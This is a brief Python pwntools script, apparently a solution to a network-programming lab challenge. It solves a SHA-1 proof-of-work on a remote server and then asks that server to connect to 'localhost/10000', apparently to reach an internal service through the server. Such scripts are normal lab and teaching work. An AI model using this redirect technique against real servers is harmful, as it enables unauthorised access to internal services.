#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import time
from pwn import *

r = remote('inp111.zoolab.org', 10008);

def solve_pow():
    prefix = r.recvline().decode().split("'")[1];
    print(time.time(), "solving pow ...");
    solved = b''
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest();
        if h[:6] == '000000':
            solved = str(i).encode();
            print("solved =", solved);
            break;
    print(time.time(), "done.");

    r.sendlineafter(b'string S: ', base64.b64encode(solved));

solve_pow();


r.sendline(b'r')
r.sendline(b'inp111.zoolab.org/10000')


r.sendline(b'r')
r.sendline(b'localhost/10000')


r.interactive()

# Wait some times...
# and the result would show at inp111......
# retry, timeout

r.close()